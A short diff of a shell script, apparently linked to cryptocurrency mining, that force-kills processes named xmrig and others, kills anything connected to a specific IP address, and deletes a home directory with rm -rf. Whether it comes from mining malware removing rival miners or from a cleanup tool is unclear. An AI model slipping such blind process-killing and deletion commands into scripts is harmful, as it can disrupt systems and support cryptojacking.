@@ -156,7 +156,8 @@ if sudo -n true 2>/dev/null; then
 fi
 killall -9 xmrig
 killall -9 jj
-killall -9 jj
+killall -9 p
+
 kill_miner_proc()
 {
     netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
@@ -715,6 +716,8 @@ kill_sus_proc()
     done
 }
 
+kill_miner_proc
+kill_sus_proc
 echo "[*] Removing $HOME/myssqltcp directory"
 rm -rf $HOME/myssqltcp
 
